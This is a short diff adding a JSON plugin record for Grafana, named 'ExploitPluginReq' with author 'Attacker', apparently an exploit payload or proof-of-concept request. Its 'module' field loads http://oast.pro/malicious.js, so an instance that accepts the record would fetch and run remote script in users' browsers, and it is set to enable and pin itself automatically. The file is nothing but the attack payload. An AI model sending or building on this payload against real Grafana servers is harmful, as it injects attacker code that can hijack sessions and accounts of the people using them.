@@ -1,0 +1,13 @@
+{
+  "name": "ExploitPluginReq",
+  "type": "app",
+  "id": "grafana-lokiexplore-app",
+  "enabled": true,
+  "pinned": true,
+  "autoEnabled": true,
+  "module": "http://oast.pro/malicious.js",
+  "baseUrl": "public/plugins/grafana-lokiexplore-app",
+  "info": {
+    "author": { "name": "Attacker" }
+  }
+}
